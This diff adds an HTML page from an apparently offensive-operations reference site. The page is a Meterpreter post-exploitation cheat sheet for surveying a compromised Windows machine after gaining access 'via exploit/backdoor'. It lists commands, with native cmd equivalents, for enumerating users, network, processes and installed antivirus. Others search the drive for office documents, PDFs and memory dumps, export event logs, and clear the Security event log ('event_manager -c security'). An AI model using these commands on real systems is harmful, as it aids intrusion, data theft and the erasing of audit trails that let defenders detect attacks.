@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <script src="css/jquery.min.js"></script>
+  <script src="css/bootstrap.min.js"></script>
+  <title>DragonFire</title>
+</head>
+<body>
+
+<!-- begin nav bar !-->  
+ <nav class="navbar navbar-inverse navbar-fixed-top">
+  <div class="container-fluid">
+    <div class="navbar-header">
+	<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>                        
+      </button>
+      <a class="navbar-brand" href="index.html">DragonFire</a>
+    </div>
+	<div class="collapse navbar-collapse" id="myNavbar">
+    <ul class="nav navbar-nav">
+      <li><a href="windows.html">Windows</a></li>
+      <li><a href="linux.html">Linux</a></li>
+	  <li><a href="other.html">Other Devices</a></li>
+	  <li><a href="misc.html">Misc</a></li>
+    </ul>
+	<ul class="nav navbar-nav navbar-right">
+	</ul>
+	</div>
+  </div>
+</nav>
+<!-- end nav bar !-->  
+
+<!-- begin breadcrumb !-->  
+<div class="container" style="margin-top:50px">
+  <div class="row">
+    <div class="col-md-12">
+
+<nav aria-label="breadcrumb" role="navigation">
+  <ol class="breadcrumb">
+    <li class="breadcrumb-item"><a href="index.html">Home</a></li>
+    <li class="breadcrumb-item"><a href="windows.html">Windows</a></li>
+    <li class="breadcrumb-item active" aria-current="page">Windows SA Checks</li>
+  </ol>
+</nav>
+
+</div>
+</div>
+</div>	
+<!-- end breadcrumb !-->  
+
+  
+<!-- begin page contents !-->
+
+
+<!-- begin page contents !-->
+<div class="container">
+  <h3>Windows SA Checks</h3>
+  <div class="row">
+    <div class="col-md-8">
+      
+	  <p>Basic situational awareness checks when connecting via meterpreter to a Windows target.</p>
+	       </div>	  
+    <!-- begin information box !-->  
+	<div class="col-md-4">
+      <div class="panel-group">
+      <div class="panel panel-info">
+	  <div class="panel-heading">Information</div>
+      <div class="panel-body">
+	  <p>Work With: Windows
+	  <br>Requires: Meterpreter Session</br>
+	  </div>
+     </div>
+     
+     </div>
+    </div>
+   </div>
+   <!-- end information box !-->  
+</div>
+
+
+<!-- begin main body !-->  
+<div class="container">
+  <div class="row">
+    <div class="col-md-12">
+    <h3>Windows SA Checks</h3>    
+    After connecting to a target via exploit/backdoor, these commands will gather valuable situational awareness information that will allow you to make a decision about the targets suitability for operations.
+	<br>Command alternatives for meterpreter commands will be provided below
+	
+    <div class="alert alert-danger" role="alert">
+    <p>This command list is not all encompassing. Only running these commands in no excuse for poor situational awareness.</p>
+    </div>	
+
+	<div class="panel-group">
+      <div class="panel panel-info">
+	  <div class="panel-heading">SA Checks</div>
+      <div class="panel-body">
+	<code>run wmic -c "os get localdatetime"
+      <br>cd C:\\windows\\temp
+      <br>getuid
+      <br>getpid
+      <br>run wmic -c "timezone list brief"
+      <br>run multicommand -cl "ipconfig /all"
+      <br>run wmic -c "computersystem get domain"
+      <br>route
+      <br>sysinfo
+      <br>run multicommand -cl "cmd /c ver"
+      <br>run get_env
+      <br>ps
+      <br>netstat
+      <br>run multicommand -cl "at","schtasks /query","net users","net accounts"
+      <br>run enum_logged_on_users -c 
+      <br>idletime
+      <br>run post/windows/gather/enum_applications
+      <br>run wmic -c "startup list"
+      <br>run getcountermeasure
+      <br>run event_manager -i
+      <br>run event_manager -l system -s /tmp/target1
+      <br>run event_manager -l application -s /tmp/target1
+      <br>run event_manager -c security
+      <br>run multicommand -cl "cmd.exe /c dir C:\\*.*doc* /S /A /o:d /t:w"
+      <br>run multicommand -cl "cmd.exe /c dir C:\\*.*ppt* /S /A /o:d /t:w"
+      <br>run multicommand -cl "cmd.exe /c dir C:\\*.*xls* /S /A /o:d /t:w"
+      <br>run multicommand -cl "cmd.exe /c dir C:\\*.*pdf /S /A /o:d /t:w"
+      <br>run multicommand -cl "netsh firewall show logging"
+      <br>run multicommand -cl "cmd.exe /c dir C:\\*.*dmp /S /A /o:d /t:w"
+      <br>search -f *.dmp
+      <br>search -f *.log
+   </code>
+	  </div>
+</div>
+<br>
+<br>
+	<div class="panel-group">
+      <div class="panel panel-info">
+	  <div class="panel-heading">Command Alternatives</div>
+      <div class="panel-body">
+      Any of the <code>run wmic ...</code> can be run in a normal cmd shell without the preceding run
+      <br><code>getuid</code> = <code>whoami</code>
+      <br><code>getpid</code> = <code> wmic process get processid,parentprocessid,executablepath|find "cmd" </code>
+      <br><code>route</code> = <code>netstat -rn</code>
+      <br><code>sysinfo</code> = <code>systeminfo</code>
+      <div class="alert alert-danger" role="alert">
+        <p>This command alternative can hang the system. Make sure you check the system load before running it </p>
+        </div>	
+      <code>run get_env</code> = <code>set</code>
+      <br><code>ps</code> = <code>tasklist /V</code>
+      <br><code>netstat</code> = <code>netstat /ano</code> 
+      <br><code>run enum_logged_on_users -c</code> = <code>query user</code>
+      <br><code>run post/windows/gather/enum_applications</code> just runs registry querys against <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall, HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall, HKLM\SOFTWARE\WOW6432NODE\Microsoft\Windows\CurrentVersion\Uninstall, HKCU\SOFTWARE\WOW6432NODE\Microsoft\Windows\CurrentVersion\Uninstall  </code> and sorts the output
+      <br><code>run getcountermeasure</code> = <code>wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct</code>
+      <br><code>run event_manager -i</code> = <code>wevtutil gli [LOGNAME] </code>
+      <br><code>run event_manager -l system -s /tmp/target1</code> = <code>wevtutil qe 'System' /rd:true /e:Events /f:text >> [OUTPUT PATH]</code>
+      <br><code>run event_manager -l application -s /tmp/target1</code> = <code>wevtutil qe 'Application' /rd:true /e:Events /f:text >> [OUTPUT PATH]</code>
+      <br><code>run event_manager -c security</code> = <code>wevtutil qe 'Security' /rd:true /e:Events /f:text >> [OUTPUT PATH]</code>
+	  </div>
+
+
+</body>
+</html>
